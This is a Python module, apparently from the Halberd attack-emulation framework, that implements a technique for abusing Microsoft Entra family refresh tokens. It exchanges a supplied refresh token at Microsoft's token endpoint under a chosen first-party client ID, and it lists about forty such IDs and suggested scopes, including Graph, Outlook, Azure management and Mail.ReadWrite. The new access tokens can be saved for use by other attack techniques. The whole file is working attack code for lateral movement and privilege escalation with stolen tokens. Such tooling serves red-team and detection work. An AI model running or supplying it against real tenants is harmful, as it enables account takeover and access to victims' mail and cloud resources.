from ..base_technique import BaseTechnique, ExecutionStatus, MitreTechnique, TechniqueReference, TechniqueNote
from ..technique_registry import TechniqueRegistry
from typing import Dict, Any, Tuple
import requests
from core.entra.entra_token_manager import EntraTokenManager

# Ref: https://github.com/secureworks/family-of-client-ids-research/blob/main/known-foci-clients.csv
client_input_options=[
    {
        "label": "microsoft_office",
        "value": "d3590ed6-52b3-4102-aeff-aad2292ab01c"
    },
    {
        "label": "office_365_management",
        "value": "00b41c95-dab0-4487-9791-b9d2c32c80f2"
    },
    {
        "label": "microsoft_azure_cli",
        "value": "04b07795-8ddb-461a-bbee-02f9e1bf7b46"
    },
    {
        "label": "microsoft_azure_powershell",
        "value": "1950a258-227b-4e31-a9cf-717495945fc2"
    },
    {
        "label": "microsoft_teams",
        "value": "1fec8e78-bce4-4aaf-ab1b-5451cc387264"
    },
    {
        "label": "windows_search",
        "value": "26a7ee05-5602-4d76-a7ba-eae8b7b67941"
    },
    {
        "label": "outlook_mobile",
        "value": "27922004-5251-4030-b22d-91ecd9a37ea4"
    },
    {
        "label": "microsoft_authenticator_app",
        "value": "4813382a-8fa7-425e-ab75-3b753aab3abb"
    },
    {
        "label": "onedrive_syncengine",
        "value": "ab9b8c07-8f02-4f72-87fa-80105867a763"
    },
    {
        "label": "visual_studio",
        "value": "872cd9fa-d31f-45e0-9eab-6e460a02d1f1"
    },
    {
        "label": "onedrive_ios_app",
        "value": "af124e86-4e96-495a-b70a-90f90ab96707"
    },
    {
        "label": "microsoft_bing_search_for_microsoft_edge",
        "value": "2d7f3606-b07d-41d1-b9d2-0d0c9296a6e8"
    },
    {
        "label": "microsoft_stream_mobile_native",
        "value": "844cca35-0656-46ce-b636-13f48b0eecbd"
    },
    {
        "label": "microsoft_teams_device_admin_agent",
        "value": "87749df4-7ccf-48f8-aa87-704bad0e0e16"
    },
    {
        "label": "microsoft_bing_search",
        "value": "cf36b471-5b44-428c-9ce7-313bf84528de"
    },
    {
        "label": "office_uwp_pwa",
        "value": "0ec893e0-5785-4de6-99da-4ed124e5296c"
    },
    {
        "label": "microsoft_to_do_client",
        "value": "22098786-6e16-43cc-a27d-191a01a1e3b5"
    },
    {
        "label": "powerapps",
        "value": "4e291c71-d680-4d0e-9640-0a3358e31177"
    },
    {
        "label": "microsoft_whiteboard_client",
        "value": "57336123-6e14-4acc-8dcf-287b6088aa28"
    },
    {
        "label": "microsoft_flow",
        "value": "57fcbcfa-7cee-4eb1-8b25-12d2030b4ee0"
    },
    {
        "label": "microsoft_planner",
        "value": "66375f6b-983f-4c2c-9701-d680650f588f"
    },
    {
        "label": "microsoft_intune_company_portal",
        "value": "9ba1a5c7-f17a-4de9-a1f1-6178c8d51223"
    },
    {
        "label": "accounts_control_ui",
        "value": "a40d7d7d-59aa-447e-a655-679a4107e548"
    },
    {
        "label": "yammer_iphone",
        "value": "a569458c-7f2b-45cb-bab9-b7dee514d112"
    },
    {
        "label": "onedrive",
        "value": "b26aadf8-566f-4478-926f-589f601d9c74"
    },
    {
        "label": "microsoft_power_bi",
        "value": "c0d2a505-13b8-4ae0-aa9e-cddd5eab0b12"
    },
    {
        "label": "sharepoint",
        "value": "d326c1ce-6cc6-4de2-bebc-4591e5e13ef0"
    },
    {
        "label": "microsoft_edge",
        "value": "e9c51622-460d-4d3d-952d-966a5b1da34c"
    },
    {
        "label": "microsoft_tunnel",
        "value": "eb539595-3fe1-474e-9c1d-feb3625d1be5"
    },
    {
        "label": "microsoft_edge",
        "value": "ecd6b820-32c2-49b6-98a6-444530e5a77a"
    },
    {
        "label": "sharepoint_android",
        "value": "f05ff7c9-f75a-4acd-a3b5-f4b6a870245d"
    },
    {
        "label": "microsoft_edge",
        "value": "f44b1140-bc5e-48c6-8dc0-5cf5a53c0e34"
    },
    {
        "label": "m365_compliance_drive_client",
        "value": "be1918be-3fe3-4be9-b32b-b542fc27f02e"
    },
    {
        "label": "microsoft_defender_platform",
        "value": "cab96880-db5b-4e15-90a7-f3f1d62ffe39"
    },
    {
        "label": "microsoft_edge_enterprise_new_tab_page",
        "value": "d7b530a4-7680-4c23-a8bf-c52c121d2e87"
    },
    {
        "label": "microsoft_defender_for_mobile",
        "value": "dd47d17a-3194-4d86-bfd5-c6ae6f5651e3"
    },
    {
        "label": "outlook_lite",
        "value": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59"
    }
]

@TechniqueRegistry.register
class EntraAbuseFamilyRefreshToken(BaseTechnique):
    def __init__(self):
        mitre_techniques = [
            MitreTechnique(
                technique_id="T1550.001",
                technique_name="Use Alternate Authentication Material",
                tactics=["Defense Evasion", "Lateral Movement"],
                sub_technique_name="Application Access Token"
            ),
            MitreTechnique(
                technique_id="T1528",
                technique_name="Steal Application Access Token",
                tactics=["Credential Access"],
                sub_technique_name=None
            )
        ]
        technique_refs = [
            TechniqueReference(
                ref_title="Family-of-client-ids-research",
                ref_link="https://github.com/secureworks/family-of-client-ids-research"
            ),
            TechniqueReference(
                ref_title="TokenTactics Tool",
                ref_link="https://github.com/rvrsh3ll/TokenTactics"
            )
        ]
        technique_notes = [
            TechniqueNote(
                "You can use a refresh token from any Microsoft family app to get access tokens for other apps"
            ),
            TechniqueNote(
                "Example scopes to try: https://graph.microsoft.com/.default, https://outlook.office365.com/.default, "
                "https://management.azure.com/.default, https://graph.microsoft.com/Mail.ReadWrite"
            ),
            TechniqueNote(
                "Common client IDs: Microsoft Office (d3590ed6-52b3-4102-aeff-aad2292ab01c), Microsoft Teams (1fec8e78-bce4-4aaf-ab1b-5451cc387264), Microsoft Azure PowerShell (1950a258-227b-4e31-a9cf-717495945fc2)"
            ),
            TechniqueNote(
                "Enable 'Save Token' to store the new access token for use with other Halberd techniques"
            ),
            TechniqueNote(
                "If you get an 'invalid_grant' error, the refresh token may have expired or been revoked"
            )
        ]
        super().__init__(
            name="Abuse Family Refresh Token", 
            description="Abuses the Microsoft family refresh token functionality to obtain access tokens for different Microsoft resources and client applications. This technique leverages the family client feature where refresh tokens obtained from one application can be used to obtain access tokens for other related applications in the Microsoft ecosystem. This allows lateral movement across different Microsoft services and potential privilege escalation by obtaining tokens with elevated permissions.",
            mitre_techniques=mitre_techniques,
            references=technique_refs,
            notes=technique_notes
        )

    def refresh_to_access_token(self, refresh_token: str, scope: str, client_id: str = "d3590ed6-52b3-4102-aeff-aad2292ab01c") -> Dict:
        """Gets new access token from refresh token"""
        # Refresh endpoint 
        tk_refresh_endpoint = f"https://login.microsoftonline.com/common/oauth2/v2.0/token"

        # Request body
        body = {
            "client_id": client_id,
            "grant_type": "refresh_token", 
            "refresh_token": refresh_token,
            "scope": scope
        }

        response = requests.post(tk_refresh_endpoint, data=body)
        return response.json()

    def execute(self, **kwargs: Any) -> Tuple[ExecutionStatus, Dict[str, Any]]:
        self.validate_parameters(kwargs)
        try:
            refresh_token: str = kwargs["refresh_token"]
            scope: str = kwargs.get("scope", ".default")
            client: str = kwargs.get("client", "d3590ed6-52b3-4102-aeff-aad2292ab01c")
        
            # Input validation
            if refresh_token in [None, ""]:
                return ExecutionStatus.FAILURE, {
                    "error": f"Refresh token is required",
                    "message": "Refresh token is required"
                }

            if client in [None, ""]:
                client = "d3590ed6-52b3-4102-aeff-aad2292ab01c" # set default client

            client_id = client

            if scope in [None, ""]:
                scope = ".default" # set default scope

            # Get new access token
            token_response = self.refresh_to_access_token(
                refresh_token=refresh_token,
                scope=scope,
                client_id=client_id
            )

            # Get token from response
            if "access_token" in token_response:
                # Save token
                if kwargs.get("save_token", False):
                    token_manager = EntraTokenManager()
                    access_token = token_response.get("access_token")
                    refresh_token = token_response.get("refresh_token", None)
                    token_manager.add_token(access_token=access_token,refresh_token=refresh_token)
                    # Set as active token
                    if kwargs.get("set_as_active", False):
                        token_manager.set_active_token(token_response["access_token"])

                return ExecutionStatus.SUCCESS, {
                    "message": f"Successfully refreshed token for {scope}",
                    "value": {
                        "access_token": token_response["access_token"],
                        "token_type": token_response.get("token_type"),
                        "expires_in": token_response.get("expires_in"),
                        "scope": token_response.get("scope"),
                        "saved": kwargs.get("save_token", False),
                        "active": kwargs.get("set_as_active", False)
                    }
                }

            return ExecutionStatus.FAILURE, {
                "error": token_response.get("error_description", "Unknown error"),
                "message": "Failed to refresh token"
            }

        except Exception as e:
            return ExecutionStatus.FAILURE, {
                "error": str(e),
                "message": "Failed to refresh token" 
            }

    def get_parameters(self) -> Dict[str, Dict[str, Any]]:
        return {
            "refresh_token": {
                "type": "str", 
                "required": True,
                "default": None,
                "name": "Refresh Token",
                "input_field_type": "text"
            },
            "client": {
                "type": "str",
                "required": False, 
                "default": "microsoft_office",
                "name": "Client",
                "input_field_type": "select",
                "input_list": client_input_options
            },
            "scope": {
                "type": "str",
                "required": False, 
                "default": ".default",
                "name": "Scope",
                "input_field_type": "text"
            },
            "save_token": {
                "type": "bool",
                "required": False,
                "default": True,
                "name": "Save Token",
                "input_field_type": "bool" 
            },
            "set_as_active": {
                "type": "bool",
                "required": False,
                "default": False,
                "name": "Set as Active Token",
                "input_field_type": "bool"
            }
        }